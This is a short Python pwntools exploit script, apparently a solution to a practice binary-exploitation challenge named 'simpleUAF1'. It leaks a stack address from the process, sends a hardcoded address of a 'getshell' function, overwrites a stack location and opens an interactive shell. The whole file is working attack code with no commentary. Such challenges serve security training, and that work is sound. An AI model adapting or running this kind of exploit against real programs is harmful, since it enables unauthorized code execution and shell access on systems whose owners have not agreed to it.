from pwn import *

getshell = 0x0000000000400a56

p = process("./simpleUAF1")
stack = int(p.recv()[:-1], 16)+0x7fff00000000
p.send(p32(getshell))
p.recv()
p.sendline("aaaa")
print p.recv()
p.sendline("3")
print p.recv()
p.send(p64(stack-8))
print p.recv()
p.send(p32(1))
p.interactive()
